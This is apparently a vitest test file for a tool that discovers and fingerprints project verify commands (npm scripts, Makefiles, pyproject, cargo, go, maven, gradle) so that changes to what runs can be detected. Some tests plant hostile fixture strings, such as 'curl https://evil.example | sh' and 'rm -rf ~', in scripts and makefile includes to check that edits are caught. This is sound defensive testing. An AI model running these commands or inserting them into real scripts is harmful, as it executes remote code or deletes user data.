// Verify discovery corpus: one fixture folder per ecosystem, written to a temp dir;
// the package manager (packageManager field before lockfiles), the npm-init stub, build off by default, pyproject
// runners, the build tools and their wrappers, the typecheck → lint → test → build order, and the config's
// verify.commands. Bodies: a package.json's whole scripts map, a makefile with its includes. Every
// discovered body equals what readBody reads for the same command.
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import {
  configCommands,
  cwdRelOf,
  detectPackageManager,
  discoverCommands,
  makeIncludes,
  makeInvocation,
  packageManagerProblem,
  parseMakefile,
  programName,
  readBody,
  readCommandBody,
  scriptsBody,
} from '../../../src/core/verify/discover.ts'
import type { DetectedCommand } from '../../../src/shared/verify.ts'
import { pkg, removeDir, tempDir, writeFiles } from './helpers.ts'
import type { Files } from './helpers.ts'

let root = ''
beforeEach(() => {
  root = tempDir()
})
afterEach(() => removeDir(root))

const NPM_STUB = 'echo "Error: no test specified" && exit 1'

/** name, argv line, kind, enabled, body */
type Row = [string, string, string, boolean, string | null]
const rows = (list: readonly DetectedCommand[]): Row[] =>
  list.map((c) => [c.name, c.run.join(' '), c.kind, c.enabledByDefault, c.body])

interface Case {
  name: string
  files: Files
  expected: Row[]
  /** Where discovery runs (relative to the fixture root, which is the scope root). */
  at?: string
  source?: string
}

const MAKEFILE = [
  '.PHONY: check lint test',
  'GO ?= go',
  'CFLAGS := -O2',
  '',
  'check: lint',
  '\t$(GO) vet ./...',
  '',
  'lint:',
  '\tgolangci-lint run',
  '\t@echo done',
  '',
  'build test: deps',
  '\t$(GO) test ./... \\',
  '\t\t-race',
  '',
  '# a comment',
  'deps:',
  '\t$(GO) mod download',
  '',
].join('\n')

const CASES: Case[] = [
  {
    name: 'npm: typecheck, lint, test; build off by default; package-lock.json',
    files: {
      'package.json': pkg({
        build: 'tsc -b',
        test: 'vitest run',
        lint: 'eslint .',
        typecheck: 'tsc --noEmit',
      }),
      'package-lock.json': '{}',
    },
    expected: ((b: string): Row[] => [
      ['typecheck', 'npm run typecheck', 'typecheck', true, b],
      ['lint', 'npm run lint', 'lint', true, b],
      ['test', 'npm run test', 'test', true, b],
      ['build', 'npm run build', 'build', false, b],
    ])(scriptsBody({ build: 'tsc -b', test: 'vitest run', lint: 'eslint .', typecheck: 'tsc --noEmit' })),
  },
  {
    name: 'the npm-init test stub is skipped',
    files: { 'package.json': pkg({ test: NPM_STUB, lint: 'eslint .' }) },
    expected: [['lint', 'npm run lint', 'lint', true, scriptsBody({ test: NPM_STUB, lint: 'eslint .' })]],
  },
  {
    name: 'packageManager wins over a lockfile',
    files: {
      'package.json': pkg({ test: 'vitest run' }, { packageManager: 'pnpm@10.28.0' }),
      'package-lock.json': '{}',
      'yarn.lock': '',
    },
    expected: [['test', 'pnpm run test', 'test', true, scriptsBody({ test: 'vitest run' })]],
  },
  {
    name: 'pnpm-lock.yaml → pnpm',
    files: { 'package.json': pkg({ 'type-check': 'tsc' }), 'pnpm-lock.yaml': "lockfileVersion: '9.0'" },
    expected: [
      ['type-check', 'pnpm run type-check', 'typecheck', true, scriptsBody({ 'type-check': 'tsc' })],
    ],
  },
  {
    name: 'yarn classic and berry are both `yarn run`',
    files: { 'package.json': pkg({ test: 'jest' }), 'yarn.lock': '', '.yarnrc.yml': 'nodeLinker: pnp' },
    expected: [['test', 'yarn run test', 'test', true, scriptsBody({ test: 'jest' })]],
  },
  {
    name: 'bun.lockb → bun',
    files: { 'package.json': pkg({ test: 'bun test' }), 'bun.lockb': '' },
    expected: [['test', 'bun run test', 'test', true, scriptsBody({ test: 'bun test' })]],
  },
  {
    name: 'no lockfile, no packageManager → npm; pre/post scripts are part of the body (every script is)',
    files: { 'package.json': pkg({ pretest: 'node setup.js', test: 'node --test', posttest: 'echo ok' }) },
    expected: [
      [
        'test',
        'npm run test',
        'test',
        true,
        scriptsBody({ pretest: 'node setup.js', test: 'node --test', posttest: 'echo ok' }),
      ],
    ],
  },
  {
    name: 'a workspace package: the root packageManager decides, cwdRel is the package',
    at: 'packages/app',
    files: {
      'package.json': pkg({}, { packageManager: 'yarn@4.5.0' }),
      'pnpm-lock.yaml': '',
      'packages/app/package.json': pkg({ lint: 'eslint src' }),
    },
    expected: [['lint', 'yarn run lint', 'lint', true, scriptsBody({ lint: 'eslint src' })]],
  },
  {
    name: 'a workspace package: the root lockfile decides',
    at: 'packages/app',
    files: { 'pnpm-lock.yaml': '', 'packages/app/package.json': pkg({ test: 'vitest run' }) },
    expected: [['test', 'pnpm run test', 'test', true, scriptsBody({ test: 'vitest run' })]],
  },
  {
    name: 'Makefile: check, lint, test; the body is the whole makefile (prerequisites and variables included)',
    files: { Makefile: MAKEFILE },
    expected: [
      ['make check', 'make check', 'typecheck', true, MAKEFILE.slice(0, -1)],
      ['make lint', 'make lint', 'lint', true, MAKEFILE.slice(0, -1)],
      ['make test', 'make test', 'test', true, MAKEFILE.slice(0, -1)],
    ],
  },
  {
    name: 'pyproject with uv.lock → uv run',
    files: {
      'pyproject.toml':
        '[project]\nname = "x"\n\n[tool.pytest.ini_options]\naddopts = "-q"\n\n[tool.ruff]\n[tool.mypy]\n',
      'uv.lock': '',
    },
    expected: [
      ['mypy', 'uv run mypy .', 'typecheck', true, null],
      ['ruff', 'uv run ruff check .', 'lint', true, null],
      ['pytest', 'uv run pytest -q', 'test', true, null],
    ],
  },
  {
    name: 'pyproject with poetry.lock → poetry run (pytest as a dependency)',
    files: {
      'pyproject.toml': '[tool.poetry.group.dev.dependencies]\npytest = "^8"\n',
      'poetry.lock': '',
    },
    expected: [['pytest', 'poetry run pytest -q', 'test', true, null]],
  },
  {
    name: 'pyproject without a lock → the tools themselves (config files count)',
    files: { 'pyproject.toml': '[project]\nname = "x"\n', 'ruff.toml': '', 'conftest.py': '' },
    expected: [
      ['ruff', 'ruff check .', 'lint', true, null],
      ['pytest', 'pytest -q', 'test', true, null],
    ],
  },
  {
    name: 'Cargo',
    files: { 'Cargo.toml': '[package]\nname = "x"\n' },
    expected: [
      ['cargo check', 'cargo check --all-targets', 'typecheck', true, null],
      ['cargo test', 'cargo test', 'test', true, null],
    ],
  },
  {
    name: 'go',
    files: { 'go.mod': 'module example.com/x\n' },
    expected: [
      ['go build', 'go build ./...', 'typecheck', true, null],
      ['go vet', 'go vet ./...', 'lint', true, null],
      ['go test', 'go test ./...', 'test', true, null],
    ],
  },
  {
    name: 'dotnet',
    files: { 'App.csproj': '<Project />' },
    expected: [['dotnet test', 'dotnet test', 'test', true, null]],
  },
  {
    name: 'maven with its wrapper',
    files: { 'pom.xml': '<project />', mvnw: '#!/bin/sh', 'mvnw.cmd': '@echo off' },
    expected: [['mvn test', './mvnw -B -q test', 'test', true, null]],
  },
  {
    name: 'maven without a wrapper',
    files: { 'pom.xml': '<project />' },
    expected: [['mvn test', 'mvn -B -q test', 'test', true, null]],
  },
  {
    name: 'gradle with only the Windows wrapper (still ./gradlew: argv is the same on every OS)',
    files: { 'build.gradle.kts': '', 'gradlew.bat': '@echo off' },
    expected: [['gradle test', './gradlew test', 'test', true, null]],
  },
  {
    name: 'gradle without a wrapper',
    files: { 'settings.gradle': '' },
    expected: [['gradle test', 'gradle test', 'test', true, null]],
  },
  {
    name: 'mixed sources: typecheck → lint → test → build across them, names unique',
    files: {
      'package.json': pkg({ test: 'vitest run', build: 'vite build', lint: 'eslint .' }),
      Makefile: 'test:\n\tnpm test\nlint:\n\tnpm run lint\n',
      'go.mod': 'module x\n',
    },
    expected: ((scripts: string, make: string): Row[] => [
      ['go build', 'go build ./...', 'typecheck', true, null],
      ['lint', 'npm run lint', 'lint', true, scripts],
      ['make lint', 'make lint', 'lint', true, make],
      ['go vet', 'go vet ./...', 'lint', true, null],
      ['test', 'npm run test', 'test', true, scripts],
      ['make test', 'make test', 'test', true, make],
      ['go test', 'go test ./...', 'test', true, null],
      ['build', 'npm run build', 'build', false, scripts],
    ])(
      scriptsBody({ test: 'vitest run', build: 'vite build', lint: 'eslint .' }),
      'test:\n\tnpm test\nlint:\n\tnpm run lint',
    ),
  },
  { name: 'an empty folder suggests nothing', files: { 'README.md': '# x' }, expected: [] },
  {
    name: 'a package.json that does not parse suggests nothing',
    files: { 'package.json': '{ "scripts": { "test": ' },
    expected: [],
  },
]

describe('discoverCommands: the corpus', () => {
  for (const c of CASES) {
    it(c.name, async () => {
      writeFiles(root, c.files)
      const folder = join(root, c.at ?? '.')
      const found = await discoverCommands(folder, { scopeRoot: root })
      expect(rows(found)).toEqual(c.expected)
      for (const cmd of found) {
        expect(cmd.cwdRel).toBe(c.at ?? '.')
        // The body a round re-reads is the body discovery showed (the same hash).
        expect(await readBody(root, cmd), cmd.name).toBe(cmd.body)
      }
    })
  }

  it('sources are labelled', async () => {
    writeFiles(root, {
      'package.json': pkg({ test: 'x' }),
      Makefile: 'lint:\n\tx\n',
      'pyproject.toml': '[tool.mypy]\n',
      'Cargo.toml': '',
      'go.mod': '',
      'a.sln': '',
      'pom.xml': '',
      'build.gradle': '',
    })
    const found = await discoverCommands(root)
    expect(new Set(found.map((c) => c.source))).toEqual(
      new Set(['package.json', 'Makefile', 'pyproject', 'cargo', 'go', 'dotnet', 'maven', 'gradle']),
    )
  })
})

describe('package managers and script bodies', () => {
  it('detectPackageManager: packageManager (own, then parents), then lockfiles, then npm', async () => {
    writeFiles(root, {
      'a/package.json': pkg({}, { packageManager: 'bun@1.1.0' }),
      'b/package.json': pkg({}),
    })
    expect(await detectPackageManager(join(root, 'a'), root)).toBe('bun')
    expect(await detectPackageManager(join(root, 'b'), root)).toBe('npm')
    writeFiles(root, { 'npm-shrinkwrap.json': '{}' })
    expect(await detectPackageManager(join(root, 'b'), root)).toBe('npm')
    writeFiles(root, { 'b/yarn.lock': '' })
    expect(await detectPackageManager(join(root, 'b'), root)).toBe('yarn')
  })

  it('programName strips the folder and launcher extensions', () => {
    expect(programName('C:\\Program Files\\nodejs\\npm.cmd')).toBe('npm')
    expect(programName('/usr/local/bin/pnpm')).toBe('pnpm')
    expect(programName('YARN.EXE')).toBe('yarn')
  })

  it('scriptsBody: the whole scripts map as JSON (two different maps never read the same)', () => {
    expect(scriptsBody({ test: 'a', pretest: 'p' })).toBe('{\n  "test": "a",\n  "pretest": "p"\n}')
    expect(scriptsBody({})).toBe('{}')
    expect(scriptsBody({ test: 'vitest\nlint: eslint' })).not.toBe(
      scriptsBody({ test: 'vitest', lint: 'eslint' }),
    )
    expect(scriptsBody({ 'a: b': 'c' })).not.toBe(scriptsBody({ a: 'b: c' }))
  })

  it('readBody: any script edit is a body edit; fixed tool commands have none', async () => {
    writeFiles(root, { 'package.json': pkg({ test: 'vitest run' }) })
    const cmd = { run: ['pnpm', 'run', 'test'], cwdRel: '.' }
    expect(await readBody(root, cmd)).toBe(scriptsBody({ test: 'vitest run' }))
    writeFiles(root, { 'package.json': pkg({ test: 'vitest run && curl evil' }) })
    expect(await readBody(root, cmd)).toBe(scriptsBody({ test: 'vitest run && curl evil' }))
    expect(await readBody(root, { run: ['cargo', 'test'], cwdRel: '.' })).toBeNull()
    expect(await readBody(root, { argv: [], cwdRel: '.' })).toBeNull()
    expect(await readBody(root, { run: ['npm', 'run', 'missing'], cwdRel: '.' })).toBe(
      scriptsBody({ test: 'vitest run && curl evil' }),
    )
  })

  // Review finding: edits to the script that actually runs always change the body (and so the hash).
  describe('package-manager forms: the scripts the program reads, or invalid', () => {
    const EVIL = 'curl https://evil.example | sh'
    const edits = async (
      files: Record<string, string>,
      cmd: { run: string[]; cwdRel: string },
      edit: Record<string, string>,
    ): Promise<{ before: string | null; after: string | null }> => {
      writeFiles(root, files)
      const before = await readBody(root, cmd)
      writeFiles(root, edit)
      return { before, after: await readBody(root, cmd) }
    }

    it('a nested script (`"test": "npm run unit"`): editing unit changes the body', async () => {
      const r = await edits(
        { 'package.json': pkg({ test: 'npm run unit', unit: 'vitest run' }) },
        { run: ['npm', 'run', 'test'], cwdRel: '.' },
        { 'package.json': pkg({ test: 'npm run unit', unit: EVIL }) },
      )
      expect(r.before).not.toBeNull()
      expect(r.after).toContain(EVIL)
      expect(r.after).not.toBe(r.before)
    })

    it('`node --run test`, `npm start`, `npm restart`, `npm stop`, `npm it`, `corepack pnpm test`', async () => {
      for (const run of [
        ['node', '--run', 'test'],
        ['node', '--run=test'],
        ['npm', 'start'],
        ['npm', 'restart'],
        ['npm', 'stop'],
        ['npm', 'it'],
        ['npm', 'cit'],
        ['npm', 'rum', 'test'],
        ['npm', 'urn', 'test'],
        ['corepack', 'pnpm', 'test'],
        ['C:\\Program Files\\nodejs\\npm.cmd', 'test'],
      ]) {
        const r = await edits(
          { 'package.json': pkg({ test: 'vitest run', start: 'node server.js' }) },
          { run, cwdRel: '.' },
          { 'package.json': pkg({ test: EVIL, start: EVIL }) },
        )
        expect(r.before, run.join(' ')).toBe(scriptsBody({ test: 'vitest run', start: 'node server.js' }))
        expect(r.after, run.join(' ')).toBe(scriptsBody({ test: EVIL, start: EVIL }))
      }
    })

    it('a cwd without its own package.json reads the nearest one above it (as npm and pnpm do)', async () => {
      const r = await edits(
        { 'package.json': pkg({ test: 'vitest run' }), 'src/a.ts': '' },
        { run: ['npm', 'test'], cwdRel: 'src' },
        { 'package.json': pkg({ test: EVIL }) },
      )
      expect(r.before).toBe(scriptsBody({ test: 'vitest run' }))
      expect(r.after).toBe(scriptsBody({ test: EVIL }))
    })

    it('a manifest Dim Factory does not parse (package.yaml, broken JSON) is covered as its whole text', async () => {
      writeFiles(root, { 'package.yaml': 'scripts:\n  test: vitest run\n' })
      expect(await readBody(root, { run: ['pnpm', 'test'], cwdRel: '.' })).toBe(
        '# package.yaml\nscripts:\n  test: vitest run\n',
      )
      removeDir(root)
      writeFiles(root, { 'package.json': '{ "scripts": { "test": "x" ' })
      expect(await readBody(root, { run: ['npm', 'test'], cwdRel: '.' })).toBe(
        '# package.json\n{ "scripts": { "test": "x" ',
      )
    })

    it('an option that picks another package is invalid ("use <pm> run <name> with cwd")', async () => {
      writeFiles(root, {
        'package.json': pkg({ test: 'vitest run' }),
        'packages/web/package.json': pkg({ test: 'vitest run' }),
      })
      for (const run of [
        ['pnpm', '--filter', 'web', 'test'],
        ['pnpm', '--filter=web', 'test'],
        ['pnpm', '-F', 'web', 'test'],
        ['pnpm', '-Fweb', 'test'],
        ['pnpm', '-C', 'packages/web', 'test'],
        ['pnpm', '--dir', 'packages/web', 'test'],
        ['pnpm', '-r', 'test'],
        ['pnpm', '-w', 'test'],
        ['pnpm', 'recursive', 'run', 'test'],
        ['pnpm', 'run', 'test', '--filter', 'web'],
        ['npm', '--prefix', 'packages/web', 'test'],
        ['npm', '--prefix=packages/web', 'test'],
        ['npm', 'run', '-w', 'packages/web', 'test'],
        ['npm', 'run', '--workspace=packages/web', 'test'],
        ['npm', 'run', '--workspaces', 'test'],
        ['npm', '-g', 'test'],
        ['yarn', 'workspace', 'web', 'test'],
        ['yarn', 'workspaces', 'foreach', 'run', 'test'],
        ['yarn', '--cwd', 'packages/web', 'test'],
        ['bun', '--filter', 'web', 'test'],
        ['corepack', 'pnpm', '-C', 'packages/web', 'test'],
      ]) {
        const r = await readCommandBody(root, { run, cwdRel: '.' })
        expect(r.body, run.join(' ')).toBeNull()
        expect(r.error, run.join(' ')).toMatch(/run another package's scripts.*use `\w+ run <name>` with/)
        expect(r.error).not.toContain('\u2014')
      }
      // After `--` the arguments are the script's own.
      expect(
        await readCommandBody(root, { run: ['npm', 'run', 'test', '--', '--dir', 'x'], cwdRel: '.' }),
      ).toEqual({
        body: scriptsBody({ test: 'vitest run' }),
      })
      expect(packageManagerProblem('npm', ['run', 'test', '--silent', '--if-present'])).toBeNull()
      expect(packageManagerProblem('pnpm', ['-C', 'x', 'test'])).toBe(
        "`-C` makes pnpm run another package's scripts, which Dim Factory cannot show you to trust: use `pnpm run <name>` with that package's folder as the command's cwd",
      )
    })
  })

  it('readBody: make with -C, -f, variables and the default goal reads the whole files', async () => {
    writeFiles(root, {
      'sub/build.mk': 'all:\n\techo all\ntest:\n\techo test\n',
      'sub/extra.mk': 'X = 1\n',
      Makefile: 'first:\n\techo first\nlint:\n\techo lint\n',
    })
    expect(
      await readBody(root, { run: ['make', '-C', 'sub', '-f', 'build.mk', 'V=1', 'test'], cwdRel: '.' }),
    ).toBe('all:\n\techo all\ntest:\n\techo test')
    expect(
      await readBody(root, {
        run: ['make', '-C', 'sub', '-f', 'build.mk', '-f', 'extra.mk', 'test'],
        cwdRel: '.',
      }),
    ).toBe('all:\n\techo all\ntest:\n\techo test\n# ---- extra.mk ----\nX = 1')
    expect(await readBody(root, { run: ['make'], cwdRel: '.' })).toBe(
      'first:\n\techo first\nlint:\n\techo lint',
    )
    expect(await readBody(root, { run: ['make', '-j', '4', 'lint', 'first'], cwdRel: '.' })).toBe(
      'first:\n\techo first\nlint:\n\techo lint',
    )
    expect(await readBody(root, { run: ['make', '-C', 'none'], cwdRel: '.' })).toBeNull()
  })

  // Review finding: `make test` runs prerequisites' recipes, variables and included files.
  describe('make: every edit to what make reads changes the body', () => {
    const cmd = { run: ['make', 'test'], cwdRel: '.' }
    const changes = async (files: Record<string, string>, edit: Record<string, string>): Promise<boolean> => {
      writeFiles(root, files)
      const before = await readCommandBody(root, cmd)
      writeFiles(root, edit)
      const after = await readCommandBody(root, cmd)
      expect(before.error).toBeUndefined()
      expect(after.error).toBeUndefined()
      return before.body !== after.body
    }

    it("a prerequisite's recipe", async () => {
      const mk = (build: string): string => `test: build\n\tgo test ./...\n\nbuild:\n\t${build}\n`
      expect(
        await changes({ Makefile: mk('go build ./...') }, { Makefile: mk('curl https://evil.example | sh') }),
      ).toBe(true)
    })

    it('a variable', async () => {
      const mk = (go: string): string => `GO = ${go}\ntest:\n\t$(GO) test ./...\n`
      expect(await changes({ Makefile: mk('go') }, { Makefile: mk('rm -rf ~ ; go') })).toBe(true)
    })

    it('an included file (and an -include that appears later), with -I folders', async () => {
      const files = {
        Makefile: 'include tools.mk\n-include local.mk\ninclude inc.mk\ntest:\n\t$(GO) test ./...\n',
        'tools.mk': 'GO = go\n',
        'mk/inc.mk': 'include deeper.mk\n',
        'deeper.mk': 'X = 1\n',
      }
      writeFiles(root, files)
      const body = await readBody(root, { run: ['make', '-I', 'mk', 'test'], cwdRel: '.' })
      expect(body).toBe(
        [
          'include tools.mk',
          '-include local.mk',
          'include inc.mk',
          'test:',
          '\t$(GO) test ./...',
          '# ---- include local.mk (not found) ----',
          '# ---- include tools.mk ----',
          'GO = go',
          '# ---- include mk/inc.mk ----',
          'include deeper.mk',
          '# ---- include deeper.mk ----',
          'X = 1',
        ].join('\n'),
      )
      expect(await changes(files, { 'tools.mk': 'GO = rm -rf ~ ; go\n' })).toBe(true)
      expect(await changes(files, { 'local.mk': 'test:\n\tcurl evil\n' })).toBe(true)
    })

    it('wildcard includes are read in order', async () => {
      writeFiles(root, { Makefile: 'include mk/*.mk\ntest:\n', 'mk/b.mk': 'B = 2\n', 'mk/a.mk': 'A = 1\n' })
      expect(await readBody(root, cmd)).toBe(
        'include mk/*.mk\ntest:\n# ---- include mk/a.mk ----\nA = 1\n# ---- include mk/b.mk ----\nB = 2',
      )
    })

    it('an include named by a variable cannot be shown: invalid', async () => {
      writeFiles(root, { Makefile: '-include $(DEPS)\ntest:\n\tgo test ./...\n' })
      const r = await readCommandBody(root, cmd)
      expect(r.body).toBeNull()
      expect(r.error).toMatch(/includes `\$\(DEPS\)`, a file name only make/)
      expect(r.error).not.toContain('—')
      // Discovery keeps the command, marked with why.
      const found = await discoverCommands(root)
      expect(found.map((c) => [c.name, c.run, c.body, c.error])).toEqual([
        ['make test', ['make', 'test'], null, r.error],
      ])
    })

    it('makeIncludes skips recipe lines and comments', () => {
      expect(
        makeIncludes('include a.mk b.mk # two\n\tinclude not-this\n  sinclude c.mk\n-include  d.mk\n'),
      ).toEqual(['a.mk', 'b.mk', 'c.mk', 'd.mk'])
    })
  })

  it('makeInvocation and parseMakefile edge cases', () => {
    expect(
      makeInvocation(['--directory=x', '--file=y.mk', '-fz.mk', '-I', 'inc', '-k', 'a', 'B=2', 'b']),
    ).toEqual({
      dir: 'x',
      files: ['y.mk', 'z.mk'],
      includeDirs: ['inc'],
      targets: ['a', 'b'],
    })
    const t = parseMakefile('X = 1\nY := 2\n%.o: %.c\n\tcc\n.PHONY: a\na b:: c\n\tone\n\n\ttwo\n\n\nother:\n')
    expect([...t.keys()]).toEqual(['a', 'b', 'other'])
    expect(t.get('a')).toBe('a b:: c\n\tone\n\n\ttwo')
  })

  it('cwdRelOf: relative with / separators; null outside', () => {
    expect(cwdRelOf(root, root)).toBe('.')
    expect(cwdRelOf(root, join(root, 'a', 'b'))).toBe('a/b')
    expect(cwdRelOf(join(root, 'a'), root)).toBeNull()
  })
})

describe('configCommands (verify.commands)', () => {
  it('tokenizes strings, keeps argv lists, reads bodies, keeps the configured order', async () => {
    writeFiles(root, {
      'app/package.json': pkg({ test: 'vitest run' }),
      'app/Makefile': 'lint:\n\truff .\n',
    })
    const out = await configCommands(
      [
        { name: 'unit', run: 'pnpm run test' },
        { name: 'lint', run: ['make', 'lint'], enabled: false },
        { name: 'e2e', run: 'node "scripts/run e2e.js" --grep=\'a b\'', timeoutMs: 120_000, cwd: '..' },
      ],
      { folder: join(root, 'app'), scopeRoot: root },
    )
    expect(out).toEqual([
      {
        name: 'unit',
        run: ['pnpm', 'run', 'test'],
        cwdRel: 'app',
        source: 'config',
        kind: 'other',
        enabledByDefault: true,
        body: scriptsBody({ test: 'vitest run' }),
      },
      {
        name: 'lint',
        run: ['make', 'lint'],
        cwdRel: 'app',
        source: 'config',
        kind: 'lint',
        enabledByDefault: false,
        body: 'lint:\n\truff .',
      },
      {
        name: 'e2e',
        run: ['node', 'scripts/run e2e.js', '--grep=a b'],
        cwdRel: '.',
        source: 'config',
        kind: 'other',
        enabledByDefault: true,
        body: null,
        timeoutMs: 120_000,
      },
    ])
  })

  it('shell syntax and a cwd outside the project are errors that keep their place', async () => {
    const out = await configCommands(
      [
        { name: 'piped', run: 'npm test | tee out.txt' },
        { name: 'chained', run: 'tsc && vitest' },
        { name: 'away', run: 'npm test', cwd: '../..' },
        { name: 'ok', run: 'npm test' },
      ],
      { folder: root },
    )
    expect(out.map((c) => [c.name, c.run, c.error ?? null])).toEqual([
      ['piped', [], expect.stringContaining('use a package script')],
      ['chained', [], expect.stringContaining('use a package script')],
      ['away', [], expect.stringContaining('outside the project')],
      ['ok', ['npm', 'test'], null],
    ])
  })
})
